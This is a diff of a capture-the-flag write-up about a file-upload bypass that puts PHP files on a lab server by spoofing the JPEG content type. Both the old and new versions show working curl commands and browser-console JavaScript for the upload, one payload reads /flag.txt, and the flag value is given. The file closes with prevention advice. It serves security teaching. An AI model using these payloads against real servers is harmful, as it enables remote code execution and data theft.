@@ -1,91 +1,74 @@
+# File Upload Bypass Vulnerability
 
+## Overview
+The upload feature at `/index.php?page=upload` allows attackers to upload PHP files by tricking the application to accept non-image files.
 
+---
 
+## Discovery
+
+1. Upload form only allows `.jpg` and `.jpeg` files.
+2. JavaScript blocks empty uploads, but not actual file content.
+3. The app checks file extensions but not the real content.
+
+---
+
+## Exploitation
+
+### **Method 1: cURL Content-Type Spoofing**
+
+```bash
+curl http://<IP_ADDRESS>/index.php?page=upload \
+  -F "Upload=Upload" \
+  -F "uploaded=@malicious.php;type=image/jpeg" \
+  -F "MAX_FILE_SIZE=100000"
 ```
-curl http://{IP_ADDRESS}/index.php\?page=upload \
--F "Upload=Upload" \
--F "uploaded=@test.php;type=image/jpeg" \
--F 'MAX_FILE_SIZE=100000' \
--H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'
-```
+- The PHP file is uploaded as if it’s a JPEG by spoofing the content-type.
 
-OR
+---
 
+### **Method 2: JavaScript in Browser Console**
 
+1. Open the upload page.
+2. Run this in the Console:
 
-async function viewFullUploadResponse() {
-  // Get current origin dynamically
-  const baseUrl = window.location.origin;
-  const uploadUrl = new URL("/index.php?page=upload", baseUrl).href;
-  console.log(`[+] Target URL: ${uploadUrl}`);
+   ```javascript
+   async function bypassUpload() {
+     const uploadUrl = window.location.origin + "/index.php?page=upload";
+     const phpCode = "<?php echo 'Bypassed!'; ?>";
+     const formData = new FormData();
+     const fileBlob = new Blob([phpCode], { type: "image/jpeg" });
+     formData.append("uploaded", fileBlob, "image.php");
+     formData.append("Upload", "Upload");
+     const response = await fetch(uploadUrl, { method: "POST", body: formData });
+     const html = await response.text();
+     console.log(html);
+   }
+   bypassUpload();
+   ```
 
-  // Create PHP payload
-  const phpPayload = `<?php
-    $flag = file_get_contents('/flag.txt');
-    echo "Flag: $flag";
-    exit(0);
-  ?>`;
+---
 
-  // Create form data for upload
-  const formData = new FormData();
-  const fileBlob = new Blob([phpPayload], { type: "image/jpeg" });
-  const randomName = `image_${Math.floor(Math.random() * 10000)}.php`;
-  formData.append("uploaded", fileBlob, randomName);
-  formData.append("Upload", "Upload");
-  
-  console.log(`[+] Attempting to upload disguised PHP file as: ${randomName}`);
-  
-  try {
-    // Send the upload request
-    const uploadResponse = await fetch(uploadUrl, {
-      method: "POST",
-      body: formData
-    });
-    
-    const responseText = await uploadResponse.text();
-    
-    // Display the FULL response in the console
-    console.log("========== FULL SERVER RESPONSE ==========");
-    console.log(responseText);
-    console.log("==========================================");
-    
-    // Also create a new window/tab with the response for easier viewing
-    const newWindow = window.open();
-    newWindow.document.write(`
-      <html>
-        <head>
-          <title>Server Response</title>
-          <style>
-            body { font-family: monospace; white-space: pre-wrap; }
-            .highlight { background-color: yellow; }
-          </style>
-        </head>
-        <body>
-          <h2>Full Server Response</h2>
-          <div>${responseText}</div>
-          
-          <script>
-            // Add a simple search function
-            const search = prompt("Enter text to highlight (or cancel for none):");
-            if (search && search.length > 0) {
-              const content = document.body.innerHTML;
-              document.body.innerHTML = content.replace(
-                new RegExp(search, 'gi'),
-                '<span class="highlight">$&</span>'
-              );
-            }
-          </script>
-        </body>
-      </html>
-    `);
-    
-    return responseText;
-  } catch (error) {
-    console.error(`[!] Error: ${error.message}`);
-  }
-}
+## Flag
 
-// Execute and see the full response
-viewFullUploadResponse();
+`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
 
+---
 
+## Security Impact
+
+- **Remote Code Execution:** Upload and run PHP code on the server
+- **Data Theft:** Access sensitive files and data
+- **System Compromise:** Full server takeover possible
+
+---
+
+## Prevention
+
+1. **Validate actual file content, not just extensions**
+2. **Use libraries (like fileinfo) for file type checks**
+3. **Re-encode images on the server**
+4. **Store uploads in non-executable locations**
+5. **Apply a strict Content Security Policy**
+
+---
